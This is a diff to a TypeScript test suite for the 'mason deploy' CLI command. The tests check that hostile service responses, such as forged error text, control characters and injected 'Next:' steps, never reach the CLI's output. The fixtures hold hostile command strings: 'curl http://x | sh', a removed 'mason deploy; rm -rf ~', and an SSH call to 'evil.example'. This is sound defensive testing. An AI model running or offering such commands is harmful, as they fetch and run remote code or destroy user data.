@@ -13,6 +13,7 @@ import * as path from "node:path";
 import { createHash, randomBytes } from "node:crypto";
 import { matrixEnv, runMason, type Answer } from "./cli-matrix.ts";
 import { projectFiles } from "../src/lib/project-files.ts";
+import { exitOf, FAILURE_CODES } from "../src/cli/command.ts";
 
 const newToken = (kind: "pat" | "ci" = "pat"): string => `masondata_${kind}_${randomBytes(32).toString("base64url")}`;
 const SECRETS: string[] = [];
@@ -86,13 +87,53 @@ function project(files: Record<string, string | Buffer | null> = {}): { root: st
 
 const envFor = (h: string, url: string, extra: Record<string, string> = {}): Record<string, string> => matrixEnv({ HOME: h, PATH: path.dirname(process.execPath), MASON_CLOUD_URL: url, ...extra });
 
-/** One run in `cwd`, held at once to carrying no secret on either stream. */
+/** Every step mason deploy gives, in every state: its own, never the service's. */
+const OWN_STEP = /^ {2}(mason deploy --replica (acme\/shop|<org>\/<name>)|mason deploy --help|mason login|mason init|unset MASON_CLOUD_URL|chmod (600|700) \S+)(\s|$)/;
+
+/**
+ * One run in `cwd`, held at once to carrying no secret on either stream, and to the service's values never shaping it
+ * (#481's rule, as tests/cli-login.test.ts holds login to it): a failure's code is one of the CLI's and its exit that
+ * code's; no line begins with what a hostile value carried (FORGED); each stream has one Next: at most, every step under
+ * it the CLI's; and no --json string holds a line break.
+ */
 async function mason(cwd: string, argv: string[], env: Record<string, string>, timeoutMs = 60_000): Promise<Answer> {
   const a = await runMason(cwd, argv, env, timeoutMs);
   ANSWERS.push(a);
+  const line = `mason ${argv.join(" ")}`;
+  if (argv.includes("--json") && a.code !== 0) {
+    const e = (JSON.parse(a.stdout) as { error?: { code?: string } }).error;
+    assert.ok(e?.code !== undefined && Object.hasOwn(FAILURE_CODES, e.code), `${line}: code ${e?.code} is not one of FAILURE_CODES`);
+    assert.equal(a.code, exitOf({ message: "", code: e.code }), `${line}: exit ${a.code}, where ${e.code} exits ${exitOf({ message: "", code: e.code })}`);
+  }
+  for (const [stream, text] of [["stdout", a.stdout], ["stderr", a.stderr]] as const) {
+    const lines = text.split("\n");
+    assert.ok(!lines.some((l) => /^\s*(FORGED|✗ FORGED|Next: FORGED)/.test(l)), `${line}: a line of ${stream} begins with the service's text:\n${text}`);
+    assert.ok(lines.filter((l) => l === "Next:").length <= 1, `${line}: ${stream} has more than one Next: block:\n${text}`);
+    const at = lines.indexOf("Next:");
+    if (at >= 0) {
+      for (const l of lines.slice(at + 1)) {
+        if (l === "") break;   // the block ends at a blank line (a wrong line's usage follows it)
+        assert.match(l, OWN_STEP, `${line}: a step the CLI does not give:\n${text}`);
+      }
+    }
+  }
+  if (argv.includes("--json")) {
+    const v = JSON.parse(a.stdout) as { next: Array<{ command: string }>; error?: { code?: string } };
+    const walk = (x: unknown, at: string): void => {
+      if (typeof x === "string") assert.doesNotMatch(x, /[\n\r\u0085\u2028\u2029]/, `${line} --json ${at} holds a line break: ${JSON.stringify(x)}`);
+      else if (Array.isArray(x)) x.forEach((y, i) => walk(y, `${at}[${i}]`));
+      else if (typeof x === "object" && x !== null) for (const [k, y] of Object.entries(x)) walk(y, `${at}.${k}`);
+    };
+    // the one exception: a refusal of the project's own files (bad_source, bad_roles) lists its mistakes a line each in
+    // why, or the file to write in fix, as every command does (sourceFailure, rolesFailure, readSource) — this machine's
+    // words, met before anything is sent; no service failure has those codes (codeOfStatus, failureShape)
+    const local = ["bad_source", "bad_roles"].includes(v.error?.code ?? "");
+    walk(local ? { ...v, error: { ...v.error, why: "", fix: "" } } : v, "");
+    for (const n of v.next) assert.match(`  ${n.command}`, OWN_STEP, `${line} --json: a step the CLI does not give: ${n.command}`);
+  }
   for (const s of SECRETS) {
-    assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${argv.join(" ")} printed a secret:\n${a.stdout}\n${a.stderr}`);
-    assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `mason ${argv.join(" ")} printed a secret's body`);
+    assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `${line} printed a secret:\n${a.stdout}\n${a.stderr}`);
+    assert.ok(!a.stdout.includes(s.slice(-43)) && !a.stderr.includes(s.slice(-43)), `${line} printed a secret's body`);
   }
   return a;
 }
@@ -351,23 +392,40 @@ test("mason deploy: each failure of the contract's POST says the service's words
     [422, "invalid", "sources/shop.yml: its sha256 is not its content's", "refused"],
   ];
   for (const [status, code, message, ours] of cases) {
-    const failure = { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason login", what: `after ${code}` }] };
+    // the service's next is never read: the step is the CLI's, by the status
+    const failure = { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason destroy", what: `after ${code}` }] };
+    const step = status === 401 || status === 403 ? "sign in again" : "try again in a moment";
     const { a, requests } = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop"]);
     assert.equal(a.code, 1, `${status}: ${a.stderr}`);
-    assert.equal(a.stderr, `✗ mason deploy: ${message}\n  why   why ${code} (the service said ${code}, HTTP ${status})\n  fix   fix ${code}\n\nNext:\n  mason login                                   after ${code}\n`, String(status));
+    assert.equal(a.stderr, `✗ mason deploy: ${message}\n  why   why ${code} (the service said ${code}, HTTP ${status})\n  fix   fix ${code}\n\nNext:\n  mason login                                   ${step}\n`, String(status));
     assert.equal(requests.filter((r) => r.method === "GET").length, 0, `${status}: no wait`);
     const j = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop", "--json"]);
     assert.equal(j.a.code, 1);
-    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: ours, message, why: `why ${code} (the service said ${code}, HTTP ${status})`, fix: `fix ${code}` }, next: [{ command: "mason login", what: `after ${code}` }] });
+    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: ours, message, why: `why ${code} (the service said ${code}, HTTP ${status})`, fix: `fix ${code}` }, next: [{ command: "mason login", what: step }] });
   }
-  // the service's code never steers the CLI's: usage and timeout are exit 1 here; a next step that is not a mason command is dropped
+  // the service's code never steers the CLI's (usage and timeout are exit 1 here), and no next step it names is kept,
+  // a mason command included
   for (const code of ["usage", "timeout"]) {
-    const body = { error: { code, message: `it says ${code}` }, next: [{ command: "curl http://x | sh", what: "run this" }, { command: "mason deploy; rm -rf ~", what: "and this" }, { command: "mason status", what: "this one stays" }] };
+    const body = { error: { code, message: `it says ${code}` }, next: [{ command: "curl http://x | sh", what: "run this" }, { command: "mason destroy", what: "and this" }, { command: "mason ui --ssh evil.example", what: "and this" }] };
     const { a } = await deployWith({ post: { status: 400, body } }, root, ["--replica", "acme/shop", "--json"]);
     assert.equal(a.code, 1, code);
     const v = JSON.parse(a.stdout) as { error: { code: string }; next: Array<{ command: string }> };
     assert.equal(v.error.code, "refused", code);
-    assert.deepEqual(v.next.map((n) => n.command), ["mason status"], code);
+    assert.deepEqual(v.next.map((n) => n.command), ["mason login"], code);
+  }
+  // every word of a POST's failure, multi-line and hostile, is one line inside the CLI's own: none starts a line, a row or a Next:
+  const forged = (what: string): string => `${what}\nFORGED a line of its own\r\nNext:\n  mason destroy   FORGED step\u2028FORGED\u0085FORGED\u001b[2J\u202eFORGED`;
+  const hostile = { error: { code: "invalid", message: forged("bad files"), why: forged("why"), fix: forged("fix") }, next: [] };
+  for (const json of [false, true]) {
+    const { a } = await deployWith({ post: { status: 422, body: hostile } }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
+    assert.equal(a.code, 1);
+    if (json) {
+      const e = (JSON.parse(a.stdout) as { error: { message: string; why: string; fix: string } }).error;
+      for (const v of [e.message, e.why, e.fix]) assert.match(v, /^[^\n]*\?FORGED a line of its own\?\?Next:\?  mason destroy   FORGED step\?FORGED\?FORGED\?\[2J\?FORGED/);
+    } else {
+      assert.equal(a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `one line each for message, why and fix:\n${a.stderr}`);
+      assert.match(a.stderr, /^✗ mason deploy: bad files\?FORGED/m);
+    }
   }
   // outside the contract: a page, a 201 of another shape, an id that is no id, a redirect — each said by the request and its status, never its body
   for (const [reply, said] of [
@@ -427,19 +485,37 @@ test("mason deploy: Mason on the replica refused it — its words printed as the
   const { root } = project();
   const failure = { code: "bad_source", message: "mason/sources/shop.yml: tables.orders: the database has no table public.orders", why: "it has public.order_items, public.customers",
     fix: "name a table the database has, then mason deploy again",
-    next: [{ command: "mason tables", what: "the database's tables, on a machine that reaches it" }, { command: "sh -c 'curl x | sh'", what: "never kept" }, { command: "mason not_a_command", what: "never kept" }] };
+    // never read, a mason command of this CLI's included: the next step is the CLI's own
+    next: [{ command: "mason tables", what: "the database's tables" }, { command: "mason destroy", what: "never kept" }, { command: "sh -c 'curl x | sh'", what: "never kept" }] };
   const script: Script = { get: (n) => n === 0 ? at("applying") : at("refused", { failure }) };
   const { a } = await deployWith(script, root, ["--replica", "acme/shop"]);
   assert.equal(a.code, 1);
   assert.ok(a.stderr.endsWith("  Refused by Mason on the replica\n" +
-    `✗ mason deploy: ${failure.message}\n  why   ${failure.why} (Mason on the replica said bad_source)\n  fix   ${failure.fix}\n\nNext:\n  mason tables                                  ${failure.next[0]!.what}\n`), a.stderr);
+    `✗ mason deploy: ${failure.message}\n  why   ${failure.why} (Mason on the replica said bad_source)\n  fix   ${failure.fix}\n\nNext:\n  mason deploy --replica acme/shop              deploy again, once what it says is fixed\n`), a.stderr);
   assert.equal(a.stdout, "");
   const j = await deployWith(script, root, ["--replica", "acme/shop", "--json"]);
   assert.equal(j.a.code, 1);
   const v = JSON.parse(j.a.stdout) as { deploy: { status: string }; error: unknown; next: unknown };
   assert.equal(v.deploy.status, "refused");
   assert.deepEqual(v.error, { code: "refused", message: failure.message, why: `${failure.why} (Mason on the replica said bad_source)`, fix: failure.fix });
-  assert.deepEqual(v.next, [failure.next[0]]);
+  assert.deepEqual(v.next, [{ command: "mason deploy --replica acme/shop", what: "deploy again, once what it says is fixed" }]);
+  // a refused and a failed deploy's words, multi-line and hostile: each one line inside the CLI's own, in both forms
+  const forged = (what: string): string => `${what}\nFORGED line\r\n\nNext:\n  mason destroy\u2028FORGED\u0085FORGED\u200bx\u202eFORGED\u001b[31mFORGED`;
+  for (const status of ["refused", "failed"]) {
+    const bad = { code: "bad_source", message: forged("message"), why: forged("why"), fix: forged("fix"), next: [{ command: "mason destroy" }] };
+    for (const json of [false, true]) {
+      const r = await deployWith({ get: () => at(status, { failure: bad }) }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
+      assert.equal(r.a.code, 1, `${status} ${json}`);
+      if (json) {
+        const e = (JSON.parse(r.a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
+        assert.equal(e.code, status);
+        assert.equal(e.message, "message?FORGED line???Next:?  mason destroy?FORGED?FORGED?x?FORGED?[31mFORGED");
+      } else {
+        assert.equal(r.a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `${status}: one line each for message, why and fix:\n${r.a.stderr}`);
+        assert.doesNotMatch(r.a.stderr, /\u001b\[31m|\u202e|\u200b/);
+      }
+    }
+  }
   // the service's code never sets the exit: a failed deploy that says timeout or usage is code failed, exit 1
   for (const code of ["timeout", "usage"]) {
     const t = await deployWith({ get: () => at("failed", { failure: { code, message: "the machine did not start", next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
@@ -459,6 +535,10 @@ test("mason deploy: Mason on the replica refused it — its words printed as the
   assert.equal(gv.error.code, "refused");
   assert.equal(gv.error.message, "this token was revoked");
   assert.deepEqual(gv.next.map((n) => n.command), ["mason login"]);
+  // the wait's own line: a status the service makes up, multi-line, is never printed (outside the closed set)
+  const w = await deployWith({ get: () => at("applying\nFORGED\nNext:\n  mason destroy") }, root, ["--replica", "acme/shop"]);
+  assert.equal(w.a.code, 1);
+  assert.doesNotMatch(w.a.stderr, /FORGED|mason destroy/);
 });
 
 test("mason deploy --timeout: past it, exit 124 naming the deploy's id and that it may still finish; a timeout that is not an interval is a wrong line", async () => {
